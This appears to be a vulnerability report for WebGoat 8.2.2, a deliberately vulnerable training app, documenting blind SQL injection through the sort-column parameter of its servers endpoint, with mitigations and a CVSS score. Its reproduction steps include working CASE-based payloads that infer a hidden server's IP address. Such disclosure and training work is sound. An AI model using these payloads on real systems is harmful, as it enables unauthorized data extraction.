# WebGoat. List of servers. Sorting criteria is vulnerable to SQL injection.
Sorting criteria in requests to the Servers Listing endpoint is vulnerable to SQL injection. 
It is possible to substitute extended ORDER BY statement instead of valid column name in request parameters. 
Then it is possible to obtain information about hidden servers from DB - IP address, MAC address, status, etc.

## Requirements Violation
The following requirements are violated:
- [Application Security Requirements v. 4.0] [11.1.6] Data Validation should be implemented according to given strategies.
- [Application Security Requirements v. 4.0] [13.4] Mitigating SQL injection.

## Business Impact
- Unauthorized access to system data.
- Facilitating other types of attack.

## Pre-requisites 
Valid user account. 

## Steps to Reproduce
1. Login to the application. Use valid session for the following requests. 
2. Make GET request to the `WebGoat/SqlInjectionMitigations/servers` endpoint with parameter `column=id`. You will see the list of servers sorted by id: 
```json
    [ {
      "id" : "1",
      "hostname" : "webgoat-dev",
      "ip" : "192.168.4.0",
      "mac" : "AA:BB:11:22:CC:DD",
      "status" : "online",
      "description" : "Development server"
    }, {
      "id" : "2",
      "hostname" : "webgoat-tst",
      "ip" : "192.168.2.1",
      "mac" : "EE:FF:33:44:AB:CD",
      "status" : "online",
      "description" : "Test server"
    }, {
      "id" : "3",
      "hostname" : "webgoat-acc",
      "ip" : "192.168.3.3",
      "mac" : "EF:12:FE:34:AA:CC",
      "status" : "offline",
      "description" : "Acceptance server"
    }, {
      "id" : "4",
      "hostname" : "webgoat-pre-prod",
      "ip" : "192.168.6.4",
      "mac" : "EF:12:FE:34:AA:CC",
      "status" : "offline",
      "description" : "Pre-production server"
    } ]
```
3. Make the similar request but with `column=hostname`. You will see the same list sorted by hostname:
```json
[ {
  "id" : "3",
  "hostname" : "webgoat-acc",
  "ip" : "192.168.3.3",
  "mac" : "EF:12:FE:34:AA:CC",
  "status" : "offline",
  "description" : "Acceptance server"
}, {
  "id" : "1",
  "hostname" : "webgoat-dev",
  "ip" : "192.168.4.0",
  "mac" : "AA:BB:11:22:CC:DD",
  "status" : "online",
  "description" : "Development server"
}, {
  "id" : "4",
  "hostname" : "webgoat-pre-prod",
  "ip" : "192.168.6.4",
  "mac" : "EF:12:FE:34:AA:CC",
  "status" : "offline",
  "description" : "Pre-production server"
}, {
  "id" : "2",
  "hostname" : "webgoat-tst",
  "ip" : "192.168.2.1",
  "mac" : "EE:FF:33:44:AB:CD",
  "status" : "online",
  "description" : "Test server"
} ]
```
4. Make a request with SQL injection in column parameter value `column=case when true then id else hostname end;`. You will see servers list sorted by id. 
5. Make another request with SQL injection where `column=case when false then id else hostname end;`. You will see servers list sorted by hostname.
It means that application accepts SQL injection in ORDER BY statement of the query. And then it is possible to retrieve information from DB by managing blind SQL injection attack.
For example, make a request with `column=case when (select cast(substring(ip, 1, 3) as int) < 110 from servers where hostname='webgoat-prd') then id else hostname end;`. Response will contain list of servers sorted by id.
So we can conclude that the first number of IP address of the production server is less than 110. Having a few of such requests done it is possible to obtain the full IP address of the server.

**Expected result:** Requests with unexpected values of column parameter are rejected.  
**Actual result:** Requests with unexpected column parameter values are handled as valid. 

## Mitigation Recommendations
1. Define a restricted set of column names which are valid to use as a sorting criteria. Reject any column values not present in the defined set.
2. Use prepared statements to run SQL queries, use all variable values as prepared statement parameters. 
3. See https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

## Additional Information
**Version**: 8.2.2  
**CVSS**: https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N